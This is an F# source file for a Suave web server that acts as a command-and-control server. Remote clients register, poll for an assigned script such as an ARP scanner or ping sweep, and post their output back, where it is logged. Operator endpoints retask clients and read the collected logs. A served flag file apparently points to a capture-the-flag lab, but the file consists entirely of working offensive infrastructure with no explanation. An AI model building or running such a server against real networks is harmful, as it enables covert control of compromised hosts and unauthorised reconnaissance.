open System
open System.IO
open System.Net
open System.Collections.Concurrent
open Suave
open Suave.Filters
open Suave.Operators
open Suave.Successful
open Suave.RequestErrors
open Suave.Files

// Define the root directory to serve files from
let rootDirectory = AppDomain.CurrentDomain.BaseDirectory

// Dictionary to keep track of clients and their script paths
let clients = ConcurrentDictionary<string, string>()

// Function to log received data
let logData (data: string) (clientId: string) =
    try
        // Save logs in a subdirectory under the root directory
        let logDir = Path.Combine(rootDirectory, "clients")
        if not (Directory.Exists(logDir)) then
            Directory.CreateDirectory(logDir) |> ignore

        let logFile = Path.Combine(logDir, $"{clientId}_log.txt")
        File.AppendAllText(logFile, $"{DateTime.Now}: {data}{Environment.NewLine}")
    with
    | ex -> printfn "Error logging data: %s" ex.Message

// Define the web server configuration
let config =
    { defaultConfig with
        bindings = [ HttpBinding.createSimple HTTP "0.0.0.0" 8000 ] }

// Define the web app
let app =
    choose [
        GET >=> choose [
            path "/" >=> file (Path.Combine(rootDirectory, "index.html"))
            path "/flag.txt" >=> file (Path.Combine(rootDirectory, "flag.txt"))
            path "/ARPScanner.txt" >=> file (Path.Combine(rootDirectory, "ARPScanner.txt"))
            path "/PingSweep.txt" >=> file (Path.Combine(rootDirectory, "PingSweep.txt"))
            path "/currentScript" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 clientId ->
                    match clients.TryGetValue(clientId) with
                    | true, scriptPath -> Successful.OK scriptPath
                    | false, _ -> RequestErrors.NOT_FOUND "Client not found"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/clients" >=> request (fun _ ->
                let clientList = String.Join(", ", clients.Keys)
                Successful.OK clientList
            )
            pathScan "/clients/%s/currentScript" (fun clientId ->
                match clients.TryGetValue(clientId) with
                | true, scriptPath -> Successful.OK scriptPath
                | false, _ -> RequestErrors.NOT_FOUND "Client not found"
            )
            pathScan "/clients/%s" (fun clientId ->
                let logDir = Path.Combine(rootDirectory, "clients")
                let logFile = Path.Combine(logDir, $"{clientId}_log.txt")
                if File.Exists(logFile) then
                    Successful.OK (File.ReadAllText(logFile))
                else
                    RequestErrors.NOT_FOUND "Log file not found"
            )
            browseHome
        ]
        POST >=> choose [
            path "/receiveOutput" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 clientId ->
                    let data = System.Text.Encoding.UTF8.GetString(r.rawForm)
                    logData data clientId
                    Successful.OK "Data received and logged"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/setScript" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 clientId ->
                    let newScriptPath = System.Text.Encoding.UTF8.GetString(r.rawForm).Trim()
                    clients.AddOrUpdate(clientId, newScriptPath, fun _ _ -> newScriptPath) |> ignore
                    Successful.OK $"Script path set to {newScriptPath} for client {clientId}"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/registerClient" >=> request (fun r ->
                match r.rawForm |> System.Text.Encoding.UTF8.GetString |> Option.ofObj with
                | Some clientId ->
                    clients.TryAdd(clientId, "/ARPScanner.txt") |> ignore
                    Successful.OK $"Client {clientId} registered"
                | None -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
        ]
    ]

// Start the web server
startWebServer config app
